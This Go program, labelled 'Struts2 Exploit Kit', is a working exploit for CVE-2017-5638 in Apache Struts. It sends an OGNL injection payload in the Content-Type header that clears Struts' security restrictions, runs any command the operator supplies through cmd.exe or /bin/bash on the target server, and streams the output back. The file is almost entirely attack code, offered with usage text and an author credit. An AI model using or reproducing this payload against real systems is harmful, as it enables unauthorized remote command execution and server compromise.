package main

import (
	"fmt"
	"os"
	"net/http"
	"io/ioutil"
	"strings"
)

func httpGet(url, commend string) (result string)  {
	var ret string

	if "http" != substr(url, 0 , 4) {
		url = "http://" + url
	}

	resp, err := http.Get(url)
	if err != nil {
		ret = "网站无法正常打开!"
	}

	defer resp.Body.Close()
	if err != nil {
		ret = "网站无法正常打开!"
	}

	if resp.StatusCode <= 400 {
		ret = httpPost(url, commend)
	}

	return ret
}

func httpPost(url, commend string) (result string) {
	client := &http.Client{}

	req, err := http.NewRequest("POST", url, strings.NewReader("name=test"))
	if err != nil {
		// handle error
	}

	req.Header.Set("Accept", "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Keep-Alive", "300")
	req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
	req.Header.Set("Accept-Language", "en-us,en;q=0.5")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36")
	req.Header.Set("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+ commend +"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")

	resp, err := client.Do(req)

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// handle error
	}
	result = string(body)

	return result
}

// 字符串截取方法.
func substr(str string, start int, end int) string  {
	rs :=[]rune(str)
	length :=len(rs)
	if start < 0 || start > length {
		return ""
	}

	if end < 0 || end > length {
		return ""
	}

	return string(rs[start:end])
}

func help()  {
	fmt.Println("[!]               : Struts2 Exploit Kit");
	fmt.Println("[!]Usage          : Linux and MacOs use ./St2-045 or Windows St2-045.exe <POC file> <Target URL> <Commend>");
	fmt.Println("[!]Affects Version: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10");
	fmt.Println("[!]CVE ID         : CVE-2017-5638");
	fmt.Println("[!]Reference      : https://cwiki.apache.org/confluence/display/WW/S2-045");
	fmt.Println("[!]Support        : www.securlty.org");
	fmt.Println("[!]Author         : Mofree");
}


func main()  {

	var url, commend string
	arg_num := len(os.Args)
	if arg_num >= 3 {
		url     = os.Args[1]
		commend = os.Args[2]
	}

	if url != "" && commend != "" {
		httpGet(url, commend)
	} else {
		help()
	}
}


